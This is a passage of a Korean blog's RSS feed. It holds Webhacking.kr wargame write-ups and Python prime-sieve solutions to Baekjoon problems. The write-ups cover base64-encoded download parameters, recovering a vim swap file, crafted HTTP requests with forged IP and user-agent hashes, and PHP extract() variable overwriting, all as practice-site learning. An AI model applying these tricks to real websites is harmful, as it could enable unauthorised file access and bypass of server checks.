      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-42"><a href="#Old-42" class="headerlink" title="Old - 42"></a>Old - 42</h2><p><img src="/images/pasted-380.png"><br>다운로드을 클릭하니, test.txt는 다운로드가 가능하였고, flag.docx은 다운로드가 불가능하였다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test123</span><br><span class="line">qwer123</span><br><span class="line">asdf234</span><br></pre></td></tr></table></figure><p>test.txt 내용을 살펴보니, 의미를 알 수 없는 글자들이 있었다.<br><br>일단 힌트나 암호일 수도 있으니 참고만 하고, 개발자 도구로 다운로드 경로를 살펴보았다.</p><p><img src="/images/pasted-381.png"><br>test.txt의 다운로드 경로를 보니, 끝에가 =로 되어있었다.<br><br>이것을 보고 base64로 인코딩이 되어있다는 것을 판단하여 디코딩을 시도하였다.</p><p><img src="/images/pasted-382.png"><br>Base64 디코딩을 해보니, test.txt로 나왔다.<br><br>이를 통해 난 flag.docx를 base64로 인코딩하여 down 파라미터에 넣어서 서버로 요청하였다.</p><p><img src="/images/pasted-383.png"><br>요청을 하니, flag.docx가 다운로드가 되었다.</p><p><img src="/images/pasted-384.png"><br>다운로드한 파일을 열어보니, flag를 얻을 수 있었다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/13/Webhacking-kr-Old-42-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 실버 4948번 문제</title>
      <link>https://lrtk-coder.github.io/2021/05/13/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-4948%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/05/13/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-4948%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Thu, 13 May 2021 17:34:08 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;베르트랑-공준&quot;&gt;&lt;a href=&quot;#베르트랑-공준&quot; class=&quot;headerlink&quot; title=&quot;베르트랑 공준&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/4948&quot;&gt;베르트랑 공준&lt;/a&gt;&lt;/h1&gt;&lt;p</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="베르트랑-공준"><a href="#베르트랑-공준" class="headerlink" title="베르트랑 공준"></a><a href="https://www.acmicpc.net/problem/4948">베르트랑 공준</a></h1><p>베르트랑 공준은 임의의 자연수 n에 대하여, n보다 크고, 2n보다 작거나 같은 소수는 적어도 하나 존재한다는 내용을 담고 있다.</p><p>이 명제는 조제프 베르트랑이 1845년에 추측했고, 파프누티 체비쇼프가 1850년에 증명했다.</p><p>예를 들어, 10보다 크고, 20보다 작거나 같은 소수는 4개가 있다. (11, 13, 17, 19) 또, 14보다 크고, 28보다 작거나 같은 소수는 3개가 있다. (17,19, 23)</p><p>자연수 n이 주어졌을 때, n보다 크고, 2n보다 작거나 같은 소수의 개수를 구하는 프로그램을 작성하시오. </p><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeList</span>():</span></span><br><span class="line">    n = <span class="number">123456</span> * <span class="number">2</span></span><br><span class="line">    sieve = [<span class="literal">True</span>] * n</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">int</span>(n ** <span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+i, n, i):</span><br><span class="line">                sieve[j] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sieve</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = primeList()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        m = n * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">            print(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        print(<span class="built_in">sum</span>(result[n+<span class="number">1</span>:m]))</span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>입력 받은 값 ~ 입력 받은 값의 2배까지의 소수 개수를 구하는 문제이다.</p><figure class="highlight python"><figcaption><span>처음 생각했던 코드</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(num ** <span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">      m = n * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">          print(<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">      count = <span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>, m):</span><br><span class="line">          <span class="keyword">if</span> isPrime(i):</span><br><span class="line">              count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      print(count)</span><br></pre></td></tr></table></figure><p>나는 처음 문제를 1929번에서 풀이하였던 소수 구하는 함수를 이용하여, 입력 값 n ~ 2n까지의 소수를 구하여 카운트를 증가시키는 코드를 제출하였다.</p><p>하지만, 매번 입력 받을 때 마다 소수를 구하는 게 문제였는지 시간초과로 이어졌다.</p><p>그래서 최대 입력값의 2배까지 소수를 모두 구하여 인덱싱을 하면 좀 더 빠르게 작동하지 하지 않을까? 라는 생각으로 접근하였다.</p><p>인터넷에 검색하여 “에라토스테네스의 체”라는 소수 구하는 방법을 알 수 있었다.</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Sieve_of_Eratosthenes_animation.gif" alt="출처: 위키백과"><br>이 처럼 배수들을 배제하는 방법으로 손쉽게 소수를 구하는 방법이다.</p><p>코드도 위키백과에 있어서 나에게 맞게끔 수정하여 사용하였다.</p><p>마지막 출력인 <code>print(sum(result[n+1:m]))</code>에서 sum 함수를 사용한 이유는 True은 1로 인식되기 때문에 이를 이용하였다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/13/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-4948%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 36 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-36-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-36-Write-Up/</guid>
      <pubDate>Wed, 12 May 2021 15:38:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-36"><a href="#Old-36" class="headerlink" title="Old - 36"></a>Old - 36</h2><p><img src="/images/pasted-376.png"><br>페이지에 출력된 글을 보면, <code>현재 디렉토리에서 vi 편집기를 사용하여 index.php 파일을 편집하는 동안 정전으로 인해 소스 코드가 사라졌습니다. 회복을 도와주세요.</code>라는데 vi가 생성한 백업 파일을 찾는 문제로 생각된다.</p><p>인터넷에 “vi 백업 파일”이라고 검색하니, swp 파일이라는 존재를 알 수 있었다.</p><blockquote><p><a href="https://rootable.tistory.com/entry/vim-%EB%B0%B1%EC%97%85%ED%8C%8C%EC%9D%BC">Always Practice :: vim 백업파일</a></p></blockquote><p>이를 토대로 swp가 어떤 이름으로 저장되는지 검색하여 index.php의 복구 파일을 서버에 요청하였다.</p><p><img src="/images/pasted-377.png"><br><code>/bonus-8/index.php.swp</code>로 서버에 요청을 보내면,</p><p><img src="/images/pasted-378.png"><br><code>index.php.swp</code>파일을 다운로드 받게 된다.</p><p><img src="/images/pasted-379.png"><br>vi로 열어서 코드를 살펴보니, 맨 밑에 Flag을 얻을 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-36-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 실버 1929번 문제</title>
      <link>https://lrtk-coder.github.io/2021/05/12/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1929%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1929%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Wed, 12 May 2021 15:09:38 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;소수-구하기&quot;&gt;&lt;a href=&quot;#소수-구하기&quot; class=&quot;headerlink&quot; title=&quot;소수 구하기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/1929&quot;&gt;소수 구하기&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;M이상</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="소수-구하기"><a href="#소수-구하기" class="headerlink" title="소수 구하기"></a><a href="https://www.acmicpc.net/problem/1929">소수 구하기</a></h1><p>M이상 N이하의 소수를 모두 출력하는 프로그램을 작성하시오.</p><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(num ** <span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">n, m = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n, m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>식<br>1978번에서 풀이했던 방법으로 소수를 구하여 풀이를 했지만, 시간 초과로 풀이에 성공하지 못하였다.</p><p>그래서 11653번 풀이를 생각을 하여, 이를 운용하였다.</p><p>루트의 근사값을 이용하여, for문의 반복수를 줄였다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1929%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 33 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-33-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-33-Write-Up/</guid>
      <pubDate>Wed, 12 May 2021 14:39:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-33"><a href="#Old-33" class="headerlink" title="Old - 33"></a>Old - 33</h2><p>이번 문제는 엄청 길어질 거 같아서 하나씩 나눠서 정리하였다.</p><h3 id="33-1-풀이"><a href="#33-1-풀이" class="headerlink" title="33-1 풀이"></a>33-1 풀이</h3><p><img src="/images/pasted-364.png"><br>view-source에서 코드를 살펴보니, 다음 문제로 넘어갈 힌트를 얻을 수 있었다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;get&#x27;</span>]==<span class="string">&quot;hehe&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Get 메소드로 <code>get=hehe</code>를 서버로 보내면, 다음 문제로 넘어갈 수 있는 a태그가 출력되는 것을 알 수 있었다.</p><p><img src="/images/pasted-365.png"><br>a태그가 출력되었고, 나는 다음 문제로 넘어갔다.</p><h3 id="33-2-풀이"><a href="#33-2-풀이" class="headerlink" title="33-2 풀이"></a>33-2 풀이</h3><p><img src="/images/pasted-366.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;post&#x27;</span>]==<span class="string">&quot;hehe&quot;</span> &amp;&amp; $_POST[<span class="string">&#x27;post2&#x27;</span>]==<span class="string">&quot;hehe2&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번 문제는 Post 메소드로 <code>post=hehe</code>와 <code>post2=hehe2</code>를 넘겨줘야 다음 문제로 넘어 갈 수 있었다.</p><p><img src="/images/pasted-367.png"><br>Post 메소드로 위의 값을 서버로 보내서 다음 문제로 넘어갈 수 있었다.</p><h3 id="33-3-풀이"><a href="#33-3-풀이" class="headerlink" title="33-3 풀이"></a>33-3 풀이</h3><p>문제 페이지에서 출력되는 텍스트는 같으니, 코드만 정리노트에 적겠다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;myip&#x27;</span>] == $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>파라미터 이름이 myip라서, 나의 IP를 넣으면 되는지 아니면 서버의 IP 주소를 넣으면 되는지를 몰라서 <code>$_SERVER[&#39;REMOTE_ADDR&#39;])</code>에 대해서 알아보았다.</p><p>그 결과 웹서버에 접속한 접속한 IP의 주소를 갖고 있는 배열이였다.</p><p><img src="/images/pasted-368.png"><br>서버에 내 IP를 보내기 위해 나의 외부 IP 주소를 알아내기 위해 네이버에 검색하여 알아낸 후, Get 메소드로 서버에 전달하였다.</p><p><img src="/images/pasted-369.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-4-풀이"><a href="#33-4-풀이" class="headerlink" title="33-4 풀이"></a>33-4 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[‘password’] == md5(time())) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “hint : “.time();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번에는 현재 시간을 MD5으로 해쉬화한 값을 Get 메소드로 서버에 전달해야한다.</p><p>나는 현재 페이지에 출력된 값을 100 증가하여, MD5 해쉬화 후 나온 값을 서버에 계속 전달할 것이다.</p><p>그럼 어느 순간 내가 보낸 시간이 도달하면 문제가 풀리는 것이다.</p><p><img src="/images/pasted-370.png"><br>다음 문제로 넘어가겠다.</p><h3 id="33-5-풀이"><a href="#33-5-풀이" class="headerlink" title="33-5 풀이"></a>33-5 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[‘imget’] &amp;&amp; $_POST[‘impost’] &amp;&amp; $_COOKIE[‘imcookie’]) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “Wrong”;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번에는 Get, Post, Cookie 값이 동일해야 다음 문제로 넘어갈 수 있었다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/challenge/bonus-6/md555.php?imget=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: webhacking.kr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=r0sakaqij4i0q7dk82fis0kchg; imcookie=1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span>: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span>: ?0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">impost=1</span><br></pre></td></tr></table></figure><p>위와 같이 메소드를 POST로 지정하여, URL에 imget 파라미터를 지정, Body에 impost를 지정, Cookie에 imcookie를 지정하여 서버로 전달하였다.</p><p><img src="/images/pasted-371.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-6-풀이"><a href="#33-6-풀이" class="headerlink" title="33-6 풀이"></a>33-6 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_COOKIE[‘test’] == md5($_SERVER[‘REMOTE_ADDR’]) &amp;&amp; $_POST[‘kk’] == md5($_SERVER[‘HTTP_USER_AGENT’])) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “hint : &#123;$_SERVER[‘HTTP_USER_AGENT’]&#125;”;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번 문제는 내 외부 IP를 MD5 해쉬화한 값, USER_AGENT 값을 MD5 해쉬화한 값을 구하여 각각 Cookie와 kk 파라미터에 지정해야한다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/challenge/bonus-6/gpcc.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: webhacking.kr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=r0sakaqij4i0q7dk82fis0kchg; test=MD5(외부 IP)</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span>: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span>: ?0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">kk=3651f072395347537c74089989c88a66</span><br></pre></td></tr></table></figure><p>위와 같이 Cookie와 kk 파라미터를 보내고 다음 문제로 넘어갈 수 있었다.</p><h3 id="33-7-풀이"><a href="#33-7-풀이" class="headerlink" title="33-7 풀이"></a>33-7 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SERVER[‘REMOTE_ADDR’] = str_replace(“.”,””,$_SERVER[‘REMOTE_ADDR’]);</span><br><span class="line"><span class="keyword">if</span>($_GET[$_SERVER[‘REMOTE_ADDR’]] == $_SERVER[‘REMOTE_ADDR’]) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “Wrong&lt;br&gt;”.$_GET[$_SERVER[‘REMOTE_ADDR’]];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번 문제는 나의 외부 IP 주소에서 <code>.</code>를 제거한 값을 Get 메소드로 전달하면 된다.</p><p><img src="/images/pasted-372.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-8-풀이"><a href="#33-8-풀이" class="headerlink" title="33-8 풀이"></a>33-8 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;addr&#x27;</span>]) $addr = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($addr == <span class="string">&quot;127.0.0.1&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span 